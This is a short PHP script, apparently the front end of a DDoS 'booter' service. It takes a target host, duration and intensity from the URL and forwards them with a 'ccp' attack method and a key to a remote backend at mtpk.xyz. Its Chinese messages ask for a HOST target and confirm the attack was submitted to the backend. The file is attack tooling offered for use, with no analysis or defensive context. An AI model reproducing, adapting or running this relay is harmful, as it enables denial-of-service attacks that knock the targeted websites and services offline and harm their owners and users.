<?php

$host = $_GET['host'];
$time = $_GET['time'];
$cx = $_GET['cx'];
$max = $_GET['max'];



if(empty($host)){
    echo "请填写HOST目标";
    exit;
}


$url='http://mtpk.xyz/bg.php/?key=key&host='.$host.'&time='.$time.'&method=ccp&Bing='.$cx.'&max='.$max.'';

$html = file_get_contents($url);

echo'已经提交后台!请勿短时间内重复提交';